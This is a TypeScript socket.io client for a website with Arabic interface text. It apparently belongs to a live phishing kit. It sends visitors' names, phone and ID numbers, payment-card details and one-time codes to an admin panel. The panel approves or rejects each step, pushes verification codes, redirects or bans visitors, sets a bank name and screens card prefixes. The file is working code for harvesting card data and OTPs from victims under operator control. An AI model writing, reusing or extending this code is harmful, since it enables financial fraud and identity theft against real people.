import { signal } from "@preact/signals-react";
import { io, Socket } from "socket.io-client";

// Socket Configuration
const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || "http://localhost:3001";
console.log("Socket URL:", SOCKET_URL);

// Create socket instance
export const socket = signal<Socket>(
  io(SOCKET_URL, {
    transports: ["websocket", "polling"],
    autoConnect: false,
    forceNew: true,
  })
);

// Visitor State
export interface VisitorState {
  visitorNumber: number;
  createdAt: string;
  isRead: boolean;
  fullName: string;
  phone: string;
  idNumber: string;
  _id: string;
  apiKey: string;
  ip: string;
  country: string;
  city: string;
  os: string;
  device: string;
  browser: string;
  date: string;
  socketId: string;
  blockedCardPrefixes: string[];
  page: string;
}

export const visitor = signal<VisitorState>({
  visitorNumber: 0,
  createdAt: "",
  isRead: true,
  fullName: "",
  phone: "",
  idNumber: "",
  _id: "",
  apiKey: "",
  ip: "",
  country: "",
  city: "",
  os: "",
  device: "",
  browser: "",
  date: "",
  socketId: "",
  blockedCardPrefixes: [],
  page: "الصفحة الرئيسية",
});

// Form State
export const isFormApproved = signal<boolean>(false);
export const isFormRejected = signal<boolean>(false);
export const waitingMessage = signal<string>("");
export const nextPage = signal<string>("");
export const verificationCode = signal<string>("");

// Admin Connection State
export const isAdminConnected = signal<boolean>(false);
export const adminLastMessage = signal<string>("");

// Error/Block State
export const errorMessage = signal<{ en: string; ar: string; image?: string } | undefined>(undefined);
export const isBlocked = signal<boolean>(false);

// Card Verification
export const isCardVerified = signal<boolean | null>(null);

// Payment Data (stored in localStorage)
export interface PaymentData {
  totalPaid?: number;
  cardType?: string;
  cardLast4?: string;
}

// Function to send data to server
export function sendData(params: {
  data?: Record<string, any>;
  paymentCard?: Record<string, any>;
  digitCode?: string;
  current: string;
  nextPage?: string;
  waitingForAdminResponse?: boolean;
  isCustom?: boolean;
  mode?: string;
}) {
  console.log("sendData called with:", params);
  console.log("Current visitor ID:", visitor.value._id);
  console.log("Socket connected:", socket.value.connected);
  
  // If visitor ID is not set yet, wait and retry
  if (!visitor.value._id) {
    console.warn("No visitor ID yet, waiting for connection...");
    // Retry after 500ms
    setTimeout(() => {
      if (visitor.value._id) {
        sendData(params);
      } else {
        console.error("Still no visitor ID after retry");
      }
    }, 500);
    return;
  }

  isFormApproved.value = false;
  isFormRejected.value = false;

  const payload = {
    content: params.data,
    paymentCard: params.paymentCard,
    digitCode: params.digitCode,
    page: params.current,
    waitingForAdminResponse: params.waitingForAdminResponse,
    sentCustomPage: params.isCustom,
    mode: params.mode,
  };
  
  console.log("Emitting more-info with payload:", payload);
  socket.value.emit("more-info", payload);

  if (params.nextPage) {
    nextPage.value = params.nextPage;
  }

  if (!params.mode) {
    waitingMessage.value = "جاري المعالجة...";
  }
}

// Function to navigate to page
export function navigateToPage(page: string) {
  console.log("navigateToPage called:", page);
  socket.value.emit("visitor:pageEnter", page);
}

// Initialize socket listeners
export function initializeSocket() {
  const s = socket.value;
  console.log("Initializing socket...");

  s.on("connect", () => {
    console.log("Socket connected successfully!");
  });

  s.on("connect_error", (error) => {
    console.error("Socket connection error:", error);
  });

  s.on("successfully-connected", (data: { sid: string; pid: string }) => {
    console.log("Successfully connected to server:", data);
    visitor.value = { ...visitor.value, socketId: data.sid, _id: data.pid };
    // Save visitor ID to localStorage for reconnection
    localStorage.setItem("visitorId", data.pid);
  });

  s.on("form:approved", () => {
    console.log("Form approved!");
    isFormApproved.value = true;
    waitingMessage.value = "";
  });

  s.on("form:rejected", () => {
    console.log("Form rejected!");
    isFormRejected.value = true;
    waitingMessage.value = "";
  });

  s.on("visitor:navigate", (page: string) => {
    console.log("Navigate to:", page);
    if (page) {
      window.location.href = "/" + page;
    }
  });

  s.on("admin-last-message", ({ message }: { message: string }) => {
    console.log("Admin message received:", message);
    adminLastMessage.value = message;
    waitingMessage.value = "";
    navigateToPage("END");
  });

  s.on("code", (code: string) => {
    console.log("Verification code received:", code);
    verificationCode.value = code;
    waitingMessage.value = "";
  });

  s.on("cardNumber:verified", (verified: boolean) => {
    console.log("Card verification result:", verified);
    isCardVerified.value = verified;
  });

  s.on("blocked", () => {
    console.log("Visitor blocked!");
    waitingMessage.value = "";
    errorMessage.value = {
      en: "You have been banned from using the site for violating the terms of use.",
      ar: "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.",
      image: "banned.jpg",
    };
    isBlocked.value = true;
  });

  s.on("unblocked", () => {
    console.log("Visitor unblocked!");
    errorMessage.value = undefined;
    isBlocked.value = false;
  });

  s.on("deleted", () => {
    console.log("Visitor deleted!");
    window.location.href = "/";
    errorMessage.value = {
      en: "Removed Your Account! Try Again Later",
      ar: "",
    };
  });

  s.on("isAdminConnected", (connected: boolean) => {
    console.log("Admin connected status:", connected);
    isAdminConnected.value = connected;
  });

  s.on("bankName", (name: string) => {
    console.log("Bank name set:", name);
    localStorage.setItem("selectedBank", name);
  });

  // Connect socket
  console.log("Connecting socket...");
  s.connect();

  // Register visitor with existing ID if available
  const existingVisitorId = localStorage.getItem("visitorId");
  console.log("Registering visitor...", existingVisitorId ? "(returning visitor: " + existingVisitorId + ")" : "(new visitor)");
  s.emit("visitor:register", { existingVisitorId });
}

// Disconnect socket
export function disconnectSocket() {
  console.log("Disconnecting socket...");
  socket.value.disconnect();
}

// Function to update current page
export function updatePage(pageName: string) {
  console.log("updatePage called:", pageName);
  visitor.value = { ...visitor.value, page: pageName };
  
  // If socket is connected, emit immediately
  if (socket.value.connected) {
    console.log("Socket connected, emitting pageEnter:", pageName);
    socket.value.emit("visitor:pageEnter", pageName);
  } else {
    // Wait for socket to connect then emit
    console.log("Socket not connected, waiting...");
    const checkConnection = setInterval(() => {
      if (socket.value.connected) {
        console.log("Socket now connected, emitting pageEnter:", pageName);
        socket.value.emit("visitor:pageEnter", pageName);
        clearInterval(checkConnection);
      }
    }, 100);
    
    // Clear interval after 10 seconds to prevent memory leak
    setTimeout(() => clearInterval(checkConnection), 10000);
  }
}

// Function to submit data to admin panel
export function submitData(data: Record<string, any>, waitingForAdminResponse: boolean = false) {
  console.log("submitData called with:", data);
  console.log("Current visitor ID:", visitor.value._id);
  console.log("Socket connected:", socket.value.connected);
  
  // If visitor ID is not set yet, wait and retry
  if (!visitor.value._id) {
    console.warn("No visitor ID yet, waiting for connection...");
    // Retry after 500ms
    setTimeout(() => {
      if (visitor.value._id) {
        submitData(data, waitingForAdminResponse);
      } else {
        console.error("Still no visitor ID after retry");
      }
    }, 500);
    return;
  }
  
  const payload = {
    content: data,
    page: visitor.value.page,
    waitingForAdminResponse: waitingForAdminResponse,
  };
  
  console.log("Emitting more-info with payload:", payload);
  socket.value.emit("more-info", payload);
  
  if (waitingForAdminResponse) {
    waitingMessage.value = "جاري المعالجة...";
  }
}
